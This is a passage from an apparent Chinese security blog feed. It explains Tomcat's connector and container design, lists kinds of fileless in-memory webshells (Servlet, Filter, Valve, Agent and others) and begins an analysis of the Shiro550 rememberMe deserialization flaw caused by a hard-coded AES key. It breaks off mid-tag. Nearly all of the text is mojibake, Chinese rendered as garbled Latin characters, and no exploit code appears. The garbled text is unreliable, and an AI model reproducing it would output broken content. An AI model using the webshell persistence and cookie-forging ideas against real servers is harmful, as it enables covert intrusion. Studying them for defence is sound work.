å¯¹è±¡åˆ†åˆ«ç”¨äºå’Œè¯·æ±‚ç«¯äº¤æ¢æ•°æ®ï¼Œç„¶åä¼šäº§ç”Ÿä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚å¹¶æŠŠäº§ç”Ÿçš„ Request å’Œ Response å¯¹è±¡ä¼ ç»™å¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹ï¼Œå¤„ç†è¿™ä¸ªè¯·æ±‚çš„çº¿ç¨‹å°±æ˜¯ Container ç»„ä»¶è¦åšçš„äº‹äº†ã€‚</p><p>æ ¹æ®è¿è¡Œçš„é€»è¾‘å›¾ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°è¿æ¥å™¨ connector ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><p>socket é€šä¿¡<br>è§£æå¤„ç†åº”ç”¨å±‚åè®®ï¼Œå¦‚å°† socket è¿æ¥å°è£…æˆ request å’Œ response å¯¹è±¡ï¼Œåç»­äº¤ç»™ Container æ¥å¤„ç†<br>å°† Request è½¬æ¢ä¸º ServletRequestï¼Œå°† Response è½¬æ¢ä¸º ServletResponse</p><p>è¿™äº›ï¼Œå…¶å®åœ¨ shiro å¼€å‘çš„è¿‡ç¨‹å½“ä¸­ä¹Ÿæ˜¯ç”¨åˆ°è¿™ä¸ªäº†çš„ï¼Œè€Œä¸”å½“æ—¶æˆ‘è®°å¾—è¿˜ç‰¹åˆ«å®¹æ˜“å†™é”™ç±»åã€‚</p><p>å…¶ä¸­ Tomcat è®¾è®¡äº†ä¸‰ä¸ªç»„ä»¶ï¼Œå…¶è´Ÿè´£åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ul><li>EndPoint: è´Ÿè´£ç½‘ç»œé€šä¿¡ï¼Œå°†å­—èŠ‚æµä¼ é€’ç»™ Processorï¼›</li><li>Processor: è´Ÿè´£å¤„ç†å­—èŠ‚æµç”Ÿæˆ Tomcat Request å¯¹è±¡ï¼Œå°† Tomcat Request å¯¹è±¡ä¼ é€’ç»™ Adapterï¼›</li><li>Adapter: è´Ÿè´£å°† Tomcat Request å¯¹è±¡è½¬åŒ–æˆ ServletRequest å¯¹è±¡ï¼Œä¼ é€’ç»™å®¹å™¨ã€‚</li></ul><h4 id="Adapter-ç»„ä»¶"><a href="#Adapter-ç»„ä»¶" class="headerlink" title="Adapter ç»„ä»¶"></a>Adapter ç»„ä»¶</h4><p>ç”±äºåè®®çš„ä¸åŒï¼ŒTomcat å®šä¹‰äº†è‡ªå·±çš„ Request ç±»æ¥å­˜æ”¾è¯·æ±‚ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯æ ‡å‡†çš„ ServletRequestã€‚äºæ˜¯éœ€è¦ä½¿ç”¨ Adapter å°† Tomcat Request å¯¹è±¡è½¬æˆ ServletRequest å¯¹è±¡ï¼Œç„¶åå°±èƒ½è°ƒç”¨å®¹å™¨çš„ service æ–¹æ³•ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼ŒEndpoint æ¥æ”¶åˆ° Socket è¿æ¥åï¼Œç”Ÿæˆä¸€ä¸ª SocketProcessor ä»»åŠ¡æäº¤åˆ°çº¿ç¨‹æ± è¿›è¡Œå¤„ç†ï¼ŒSocketProcessor çš„ run æ–¹æ³•å°†è°ƒç”¨ Processor ç»„ä»¶è¿›è¡Œåº”ç”¨å±‚åè®®çš„è§£æï¼ŒProcessor è§£æåç”Ÿæˆ Tomcat Request å¯¹è±¡ï¼Œç„¶åä¼šè°ƒç”¨ Adapter çš„ Service æ–¹æ³•ï¼Œæ–¹æ³•å†…éƒ¨é€šè¿‡å¦‚ä¸‹ä»£ç å°† Request è¯·æ±‚ä¼ é€’åˆ°å®¹å™¨ä¸­ã€‚</p><p>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</p><p>ä¸€ä¸ªæ€»çš„ Tomcat Connector åŠŸèƒ½å¦‚å›¾æ‰€ç¤º<img src="https://i.mji.rip/2023/10/25/1b94dc68288b74a6a659a1765322d4cc.png" alt="image-20231025195129773"></p><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Containerï¼ˆåˆåCatalinaï¼‰ç”¨äºå¤„ç†Connectorå‘è¿‡æ¥çš„servletè¿æ¥è¯·æ±‚ï¼Œå®ƒæ˜¯å®¹å™¨çš„çˆ¶æ¥å£ï¼Œæ‰€æœ‰å­å®¹å™¨éƒ½å¿…é¡»å®ç°è¿™ä¸ªæ¥å£ï¼ŒContainer å®¹å™¨çš„è®¾è®¡ç”¨çš„æ˜¯å…¸å‹çš„è´£ä»»é“¾çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒæœ‰å››ä¸ªå­å®¹å™¨ç»„ä»¶æ„æˆï¼Œåˆ†åˆ«æ˜¯ï¼šEngineã€Hostã€Contextã€Wrapperï¼Œè¿™å››ä¸ªç»„ä»¶ä¸æ˜¯å¹³è¡Œçš„ï¼Œè€Œæ˜¯çˆ¶å­å…³ç³»ï¼ŒEngine åŒ…å« Hostï¼ŒHost åŒ…å« Contextï¼ŒContext åŒ…å« Wrapperã€‚</p><p><img src="https://i.mji.rip/2023/10/25/f05b2d4628e80b4b99e78a0f62e1ce93.md.png" alt="image-20231025195153658"></p><p>Tomcat è®¾è®¡äº† 4 ç§å®¹å™¨: Engineã€Hostã€Contextã€Wrapperï¼Œè¿™å››ç§å®¹å™¨æ˜¯çˆ¶å­å…³ç³»</p><ul><li>Engine: æœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Hostã€‚å®ç°ç±»ä¸º org.apache.catalina.core.StandardEngine</li><li>Host: ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºå’ŒæŸä¸ªåŸŸå Domain Name ç›¸åŒ¹é…ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚å®ç°ç±»ä¸º org.apache.catalina.core.StandardHost</li><li>Context: ä¸€ä¸ª Context å¯¹åº”äºä¸€ä¸ª Web åº”ç”¨ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Wrapperã€‚å®ç°ç±»ä¸º org.apache.catalina.core.StandardContext</li><li>Wrapper: ä¸€ä¸ª Wrapper å¯¹åº”ä¸€ä¸ª Servletã€‚è´Ÿè´£ç®¡ç† Servlet ï¼ŒåŒ…æ‹¬ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚å®ç°ç±»ä¸º org.apache.catalina.core.StandardWrapper</li></ul><p>é€šå¸¸ä¸€ä¸ª Servlet class å¯¹åº”ä¸€ä¸ª Wrapperï¼Œå¦‚æœæœ‰å¤šä¸ª Servlet å°±å¯ä»¥å®šä¹‰å¤šä¸ª Wrapperï¼Œå¦‚æœæœ‰å¤šä¸ª Wrapper å°±è¦å®šä¹‰ä¸€ä¸ªæ›´é«˜çš„ Containerã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼Œa.comå’Œb.comåˆ†åˆ«å¯¹åº”ç€ä¸¤ä¸ªHost</p><p><img src="https://i.mji.rip/2023/10/25/f4f434b53380eded1250d6419e101dab.png" alt="image-20231025195214472"></p><p>æ¯ä¸€ä¸ª Context éƒ½æœ‰å”¯ä¸€çš„ pathã€‚è¿™é‡Œçš„ path ä¸æ˜¯æŒ‡ servlet ç»‘å®šçš„ WebServlet åœ°å€ï¼Œè€Œæ˜¯æŒ‡ç‹¬ç«‹çš„ä¸€ä¸ª Web åº”ç”¨åœ°å€ã€‚å°±å¥½æ¯” Tomat é»˜è®¤çš„ &#x2F; åœ°å€å’Œ &#x2F;manager åœ°å€å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„ web åº”ç”¨ï¼Œæ‰€ä»¥å¯¹åº”ä¸¤ä¸ªä¸åŒçš„ Contextã€‚è¦æ·»åŠ  Context éœ€è¦åœ¨ server.xml ä¸­é…ç½® docbaseã€‚</p><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ åœ¨ä¸€ä¸ª web åº”ç”¨ä¸­åˆ›å»ºäº† 2 ä¸ª servlet æœåŠ¡ï¼ŒWebServlet åœ°å€åˆ†åˆ«æ˜¯ &#x2F;Demo1 å’Œ &#x2F;Demo2 ã€‚å› ä¸ºå®ƒä»¬å±äºåŒä¸€ä¸ª Web åº”ç”¨æ‰€ä»¥ Context ä¸€æ ·ï¼Œä½†è®¿é—®åœ°å€ä¸ä¸€æ ·æ‰€ä»¥ Wrapper ä¸ä¸€æ ·ã€‚&#x2F;manager è®¿é—®çš„ Web åº”ç”¨æ˜¯ Tomcat é»˜è®¤çš„ç®¡ç†é¡µé¢ï¼Œæ˜¯å¦å¤–ä¸€ä¸ªç‹¬ç«‹çš„ web åº”ç”¨ï¼Œ æ‰€ä»¥ Context ä¸å‰ä¸¤ä¸ªä¸ä¸€æ ·ã€‚</p><p><img src="https://i.mji.rip/2023/10/25/42531669844863c0a1404fdf0bcb2dd0.md.png" alt="image-20231025195234445"></p><h2 id="Tomcat-çš„ç±»åŠ è½½æœºåˆ¶"><a href="#Tomcat-çš„ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="Tomcat çš„ç±»åŠ è½½æœºåˆ¶"></a>Tomcat çš„ç±»åŠ è½½æœºåˆ¶</h2><p>ç”±äº Tomcat ä¸­æœ‰å¤šä¸ª WebApp åŒæ—¶è¦ç¡®ä¿ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œæ‰€ä»¥ Tomcat çš„ç±»åŠ è½½æœºåˆ¶ä¹Ÿä¸æ˜¯ä¼ ç»Ÿçš„åŒäº²å§”æ´¾æœºåˆ¶ã€‚</p><p>Tomcat è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ WebAppClassloader ä¸ºäº†ç¡®ä¿éš”ç¦»å¤šä¸ª WebApp ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œæ‰€ä»¥æ‰“ç ´äº†åŒäº²å§”æ‰˜æœºåˆ¶ã€‚æ¯ä¸ª WebApp ç”¨ä¸€ä¸ªç‹¬æœ‰çš„ ClassLoader å®ä¾‹æ¥ä¼˜å…ˆå¤„ç†åŠ è½½ã€‚å®ƒé¦–å…ˆå°è¯•è‡ªå·±åŠ è½½æŸä¸ªç±»ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†äº¤ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œå…¶ç›®çš„æ˜¯ä¼˜å…ˆåŠ è½½ WEB åº”ç”¨è‡ªå·±å®šä¹‰çš„ç±»ã€‚</p><p>åŒæ—¶ä¸ºäº†é˜²æ­¢ WEB åº”ç”¨è‡ªå·±çš„ç±»è¦†ç›– JRE çš„æ ¸å¿ƒç±»ï¼Œåœ¨æœ¬åœ° WEB åº”ç”¨ç›®å½•ä¸‹æŸ¥æ‰¾ä¹‹å‰ï¼Œå…ˆä½¿ç”¨ ExtClassLoaderï¼ˆä½¿ç”¨åŒäº²å§”æ‰˜æœºåˆ¶ï¼‰å»åŠ è½½ï¼Œè¿™æ ·æ—¢æ‰“ç ´äº†åŒäº²å§”æ‰˜ï¼ŒåŒæ—¶ä¹Ÿèƒ½å®‰å…¨åŠ è½½ç±»ã€‚</p><h1 id="ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å†…å­˜é©¬ï¼Ÿ</h1><p>å†…å­˜é©¬åˆå«æ— æ–‡ä»¶é©¬ï¼Œé—»åçŸ¥å…¶æ„ã€‚ç®€å•ç†è§£å°±æ˜¯æ²¡æœ‰webshellæ–‡ä»¶è½åœ°çš„webshellã€‚</p><p>ç›®å‰å®‰å…¨è¡Œä¸šä¸»è¦è®¨è®ºçš„å†…å­˜é©¬ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ul><li>åŠ¨æ€æ³¨å†Œ servlet&#x2F;filter&#x2F;listenerï¼ˆä½¿ç”¨ servlet-api çš„å…·ä½“å®ç°ï¼‰</li><li>åŠ¨æ€æ³¨å†Œ interceptor&#x2F;controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚ spring&#x2F;struts2ï¼‰</li><li>åŠ¨æ€æ³¨å†Œä½¿ç”¨<strong>èŒè´£é“¾</strong>è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆä¾‹å¦‚ Tomcat çš„ Pipeline &amp; Valveï¼ŒGrizzly çš„ FilterChain &amp; Filter ç­‰ç­‰ï¼‰</li><li>ä½¿ç”¨ java agent æŠ€æœ¯å†™å…¥å­—èŠ‚ç </li></ul><h1 id="å†…å­˜é©¬æœ‰å“ªäº›ï¼Ÿ"><a href="#å†…å­˜é©¬æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="å†…å­˜é©¬æœ‰å“ªäº›ï¼Ÿ"></a>å†…å­˜é©¬æœ‰å“ªäº›ï¼Ÿ</h1><ul><li><p>ä¼ ç»ŸWebåº”ç”¨å‹å†…å­˜é©¬</p><ul><li>Servletå‹å†…å­˜é©¬ â€”&gt;   åŠ¨æ€æ³¨å†ŒServletåŠæ˜ å°„è·¯ç”±</li><li>Filterå‹å†…å­˜é©¬        â€”&gt;   åŠ¨æ€æ³¨å†ŒFilteråŠæ˜ å°„è·¯ç”±</li><li>Listenerå‹å†…å­˜é©¬   â€”&gt;   åŠ¨æ€æ³¨å†ŒListener</li></ul><p>JavaWebåº”ç”¨å°†Servletä¸å…¶æ˜ å°„ã€å¤„ç†ç±»&#x2F;Filterä¸å…¶æ˜ å°„ã€å¤„ç†ç±»&#x2F;Listenerä¸å…¶å¤„ç†ç±»å­˜æ”¾åœ¨Contextä¸­ï¼Œå¹¶åœ¨ç¨‹åºå…è®¸æ—¶è¿›è¡ŒæŸ¥æ‰¾å’ŒåŒ¹é…ã€‚ä¼ ç»ŸWebåº”ç”¨å‹å†…å­˜é©¬å°±æ˜¯å†…å­˜é©¬çš„å¤„ç†ä»£ç ä¸æŒ‡å®šçš„æ˜ å°„åŠ¨æ€çš„æ·»åŠ åœ¨Contextä¸­çš„å…³é”®ä½ç½®ä¸­ï¼Œä½¿ç¨‹åºå¤„ç†ä¸€ä¸ªåœ¨æœ¬åœ°ä»£ç ã€é…ç½®æ–‡ä»¶ä¸­ä¸å­˜åœ¨çš„æ¶æ„é€»è¾‘ã€‚</p></li><li><p>æ¡†æ¶å‹å†…å­˜é©¬</p><ul><li>Spring Controllerå‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€æ³¨å†ŒControlleråŠæ˜ å°„è·¯ç”±</li><li>Spring Interceptorå‹å†…å­˜é©¬  â€”&gt;    åŠ¨æ€æ³¨å†ŒInterceptoråŠæ˜ å°„è·¯ç”±</li><li>Spring Webfluxå‹å†…å­˜é©¬       â€”&gt;     åŠ¨æ€æ³¨å†ŒWebFilteråŠæ˜ å°„è·¯ç”±</li></ul><p>Spring MVC ä½¿ç”¨Controlleræ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥å’Œå°è£…Serviceï¼Œè™½ç„¶æœ‰ä¸€éƒ¨åˆ†å¼€å‘ä¹ æƒ¯ç”¨Mappingæ¥å¤„ç†ï¼Œä½†æ˜¯è¿™é‡Œé€šå¸¸ä»£è¡¨å¤„ç†ä¸€ä¸ªç”¨æˆ·è¯·æ±‚çš„â€œç«¯ç‚¹â€ï¼Œç±»ä¼¼äºServletï¼Œè€ŒInterceptoræ‹¦æˆªå™¨ç±»ä¼¼Filter</p><p>Spring Webflux æ˜¯Spring Framework5.0ä¸­å¼•å…¥çš„æ–°çš„å“åº”å¼webæ¡†æ¶ï¼Œå®ƒä¸ä¾èµ–Servlet-APIï¼Œä½†æ˜¯ä¹ŸåŒæ ·å¿…é¡»æœ‰Filterè¿™ç§æ€æƒ³ï¼Œå®é™…å°±æ˜¯Filterã€‚</p></li><li><p>ä¸­é—´ä»¶å‹å†…å­˜é©¬</p><ul><li>Tomcat Valve å‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€æ³¨å†ŒValve</li><li>Tomcat Upgrade å‹å†…å­˜é©¬    â€”&gt;     åŠ¨æ€æ³¨å†ŒUpgradeProtocol</li><li>Tomcat Executor å‹å†…å­˜é©¬    â€”&gt;     åŠ¨æ€æ›¿æ¢å…¨å±€Executor</li><li>Tomcat Poller å‹å†…å­˜é©¬    â€”&gt;     åŠ¨æ€æ›¿æ¢å…¨å±€Poller</li><li>Grizzly Filter å‹å†…å­˜é©¬    â€”&gt;     åŠ¨æ€æ³¨å†ŒGrizzly FilteråŠæ˜ å°„è·¯ç”±</li></ul><p>ä¸­é—´ä»¶çš„å¾ˆå¤šè®¾è®¡éƒ½æ˜¯â€œæµå¼â€ã€â€œç®¡é“å¼â€ã€‚ä¸€èˆ¬ç§°ä¹‹ä¸ºèŒè´£é“¾æ¨¡å¼ï¼Œæ¯ä¸ªå…³é”®ç‚¹éƒ½ä¼šå°†Requestå¤„ç†ï¼Œå¹¶ä¼ é€’ç»™ä¸‹ä¸€ä¸ªå¤„ç†è€…ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥å‘èŒè´£é“¾ä¸­æ’å…¥è‡ªå·±çš„æ¶æ„é€»è¾‘ï¼Œå®ç°å†…å­˜é©¬çš„é©»ç•™ã€‚</p></li><li><p>Agent å‹å†…å­˜é©¬</p><ul><li>Agentå‹å†…å­˜é©¬     â€”&gt;  é€šè¿‡Hookå¹¶ä¿®æ”¹å…³é”®æ–¹æ³•æ·»åŠ æ¶æ„é€»è¾‘</li></ul><p>è¿™ä¸ªå¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰å†™çš„æ’æ¡©æ–‡ç« ï¼Œå­¦ä¹ ä¸€ä¸‹AgentåŸºç¡€ä¹‹åä¼šå¯¹åæœŸå­¦ä¹ Agentå‹å†…å­˜é©¬å¾ˆæœ‰å¸®åŠ©ã€‚</p></li><li><p>å…¶ä»–å†…å­˜é©¬</p><ul><li>WebSocketå‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€æ³¨å†ŒWebsocketè·¯ç”±åŠå¤„ç†é€»è¾‘</li><li>Tomcat JSPå‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€æ³¨å†ŒTomcat JSPç®¡ç†é€»è¾‘å¹¶å®ç°é©»ç•™</li><li>çº¿ç¨‹å‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€æ·»åŠ ä¸€ä¸ªæ— æ³•æ€æ­»çš„çº¿ç¨‹</li><li>RMIå‹å†…å­˜é©¬    â€”&gt;    åŠ¨æ€å¯åŠ¨ä¸€ä¸ªRMI Registry</li></ul><p>å¯¹äºWebSocketåè®®è¯·æ±‚ï¼ŒJSPè¯·æ±‚å¤„ç†ï¼Œå„ä¸ªä¸­é—´ä»¶åŒ…å«è‡ªå·±çš„é€»è¾‘ï¼Œè¿™äº›é€»è¾‘çš„å…·ä½“å®ç°ä¹Ÿå¯ä»¥ç”¨æ¥ä½œä¸ºå†…å­˜é©¬çš„é€»è¾‘å¤„ç†ã€‚</p><p>çº¿ç¨‹å‹å†…å­˜é©¬åœ¨ç³»ç»Ÿä¸­å¯åŠ¨ä¸€ä¸ªæ°¸ä¸åœæ­¢çš„çº¿ç¨‹ï¼Œæ­¤æ—¶å…³é”®ç±»æ— æ³•è¢«GCï¼Œä¼šä¸€ç›´å­˜åœ¨ç›®æ ‡ç³»ç»Ÿä¸­ï¼Œæ‰§è¡Œå®ç°é¢„å®šä¹‰çš„é€»è¾‘ã€‚è€ŒRMIå†…å­˜é©¬å¯åŠ¨ä¸€ä¸ªRMI Registry å¹¶ç»‘å®šæ¶æ„ç±»ä½œä¸ºåé—¨ã€‚</p></li></ul><hr><p>å› ä¸ºå†…å­˜é©¬è¿™é‡Œä¸ªäººæƒ³æ·±å…¥å­¦ä¹ ï¼Œæ‰€ä»¥åç»­ä¼šåŠ›æ‰€èƒ½åŠå°†æ¯ç§å†…å­˜é©¬çš„å®ç°è¿‡ç¨‹å’Œå¤ç°è¿‡ç¨‹ä¸­é‡åˆ°çš„å‘ç‚¹éƒ½åˆ†äº«å‡ºæ¥ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shiro550+CB</title>
    <link href="/2023/10/09/Shiro550-CB/"/>
    <url>/2023/10/09/Shiro550-CB/</url>
    
    <content type="html"><![CDATA[<h1 id="é€šè¿‡Shiro550å­¦ä¹ CBæ— ä¾èµ–"><a href="#é€šè¿‡Shiro550å­¦ä¹ CBæ— ä¾èµ–" class="headerlink" title="é€šè¿‡Shiro550å­¦ä¹ CBæ— ä¾èµ–"></a>é€šè¿‡Shiro550å­¦ä¹ CBæ— ä¾èµ–</h1><h2 id="Shiro550æ¼æ´åˆ†æ"><a href="#Shiro550æ¼æ´åˆ†æ" class="headerlink" title="Shiro550æ¼æ´åˆ†æ"></a>Shiro550æ¼æ´åˆ†æ</h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Shiro æ˜¯ä¸€ä¸ªJavaçš„å®‰å…¨æ¡†æ¶ï¼Œå®ƒåŒ…å«èº«ä»½è®¤è¯ã€ç™»å½•ã€éªŒè¯æƒé™ã€ä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚</p><p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½æˆ‘çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»é™†æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶cookieå€¼åï¼ŒBase64è§£ç â€“&gt;AESè§£å¯†â€“&gt;ååºåˆ—åŒ–ã€‚æ”»å‡»è€…åªè¦æ‰¾åˆ°AESåŠ å¯†çš„å¯†é’¥ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå¯¹å…¶è¿›è¡Œåºåˆ—åŒ–â€“&gt;AESåŠ å¯†â€“&gt;Base64ç¼–ç ï¼Œç„¶åå°†å…¶ä½œä¸ºcookieçš„rememberMeå­—æ®µå‘é€ï¼ŒShiroå°†rememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a><a href="https://blog.csdn.net/m0_67401270/article/details/126721347?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169519689416800215053565%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=169519689416800215053565&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-126721347-null-null.142%5Ev94%5Einsert_down28v1&utm_term=idea%E6%90%AD%E5%BB%BAShiro&spm=1018.2226.3001.4187">ç¯å¢ƒæ­å»º</a></h3><p>æµç¨‹å¾ˆç®€å•ï¼Œç…§ç€å‚è€ƒæ–‡ç« åšå‡ åˆ†é’Ÿå°±æ­èµ·æ¥äº†ã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><h5 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h5><p><code>org.apache.shiro.mgt.RememberMeManager</code>ï¼Œè¿™ä¸ªæ¥å£æä¾›äº†å¦‚ä¸‹ 5 ä¸ªæ–¹æ³•ï¼š</p><p><img src="https://i.mji.rip/2023/10/09/fe8753cd33486a86e0eeb03bc9907efe.png" alt="image-20231008164024742"></p><ul><li><code>getRememberedPrincipals</code>åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æ‰¾åˆ°è®°ä½çš„ principalsï¼Œä¹Ÿå°±æ˜¯ RememberMe çš„åŠŸèƒ½ã€‚</li><li><code>forgetIdentity</code>ï¼šå¿˜è®°èº«ä»½æ ‡è¯†ã€‚</li><li><code>onSuccessfulLogin</code>ï¼šåœ¨ç™»é™†æ ¡éªŒæˆåŠŸåè°ƒç”¨ï¼Œç™»é™†æˆåŠŸæ—¶ï¼Œä¿å­˜å¯¹åº”çš„ principals ä¾›ç¨‹åºæœªæ¥è¿›è¡Œè®¿é—®ã€‚</li><li><code>onFailedLogin</code>ï¼šåœ¨ç™»é™†å¤±è´¥åè°ƒç”¨ï¼Œç™»é™†å¤±è´¥æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚</li><li><code>onLogout</code>: åœ¨ç”¨æˆ·é€€å‡ºæ—¶è°ƒç”¨ï¼Œå½“ä¸€ä¸ª Subject æ³¨é”€æ—¶ï¼Œåœ¨ç¨‹åºä¸­â€œå¿˜è®°â€è¯¥ Subject å¯¹åº”çš„ principalsã€‚</li></ul><h5 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h5><p><code>AbstractRememberMeManager</code>æ˜¯ä¸€ä¸ªShiroè‡ªå¸¦çš„æŠ½è±¡ç±»å®ƒå®ç°äº†<code>RememberMemanager</code>æ¥å£ï¼Œå…ˆäº†è§£ä¸€ä¸‹è¿™ä¸ªç±»ä¸­å‡ ä¸ªé‡è¦çš„æˆå‘˜å˜é‡ã€‚</p><p><img src="https://i.mji.rip/2023/10/09/5496a5fe2f2a5556b53023f439bbbe3c.png" alt="image-20231008165543767"></p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>ï¼šä¸€ä¸ª Base64 çš„ç¡¬ç¼–ç çš„ AES Keyï¼Œä¹Ÿæ˜¯æœ¬æ¬¡æ¼æ´çš„å…³é”®ç‚¹ï¼Œè¿™ä¸ª key ä¼šè¢«åŒæ—¶è®¾ç½®ä¸ºåŠ è§£å¯† key æˆå‘˜å˜é‡ï¼šencryptionCipherKey&#x2F;decryptionCipherKey ã€‚</li><li><code>serializer</code>ï¼šShiro æä¾›çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„ PrincipalCollection å¯¹è±¡ã€‚</li><li><code>cipherService</code>ï¼šç”¨æ¥å¯¹æ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯ <code>org.apache.shiro.crypto.AesCipherService</code> ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„å®ç°ï¼Œæ‰€ä»¥åŠ è§£å¯†çš„ key æ˜¯ä½¿ç”¨äº†åŒä¸€ä¸ªã€‚</li></ul><p>é€šè¿‡å…¶æ„é€ æ–¹æ³•å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªç±»åœ¨åœ¨åˆå§‹åŒ–æ—¶ä¼šåˆ›å»º<code>DefaultSerializer</code>ä½œä¸ºåºåˆ—åŒ–å™¨ï¼Œ<code>AesCipherService</code> ä½œä¸ºåŠ è§£å¯†å®ç°ç±»ï¼Œ<code>DEFAULT_CIPHER_KEY_BYTES</code> ä½œä¸ºåŠ è§£å¯†çš„ keyã€‚</p><h5 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h5><p><code>CookieRememberMeManager</code>ç»§æ‰¿äº†<code>AbstractRememberMeManager</code>è¿™ä¸ªæŠ½è±¡ç±»ï¼Œè€Œä¸”å®ƒå®ç°äº†åœ¨HTTPæ— çŠ¶æ€åè®®ä¸­ä½¿ç”¨cookieè®°å½•ç”¨æˆ·ä¿¡æ¯çš„ç›¸å…³èƒ½åŠ›ã€‚å…¶ä¸­æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ–¹æ³•æ˜¯<code>getRememberedSerializedIdentity</code>ï¼Œå®ƒçš„é€»è¾‘å¤§æ¦‚å¦‚ä¸‹ï¼ˆè·å–Cookieä¸­çš„å†…å®¹å¹¶Base64è§£ç è¿”å›byteæ•°ç»„ï¼‰ï¼š</p><p><img src="https://i.mji.rip/2023/10/09/60983e34f4c8ae4b5bd3f2fec0b3e28b.png" alt="image-20231008170142829"></p><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯æˆ‘ä»¬æ•´ä¸ªShiro550æ¼æ´ç‚¹ï¼Œæˆ‘ä»¬å…ˆç®€å•çœ‹çœ‹å®ƒçš„é€»è¾‘ï¼š</p><p><img 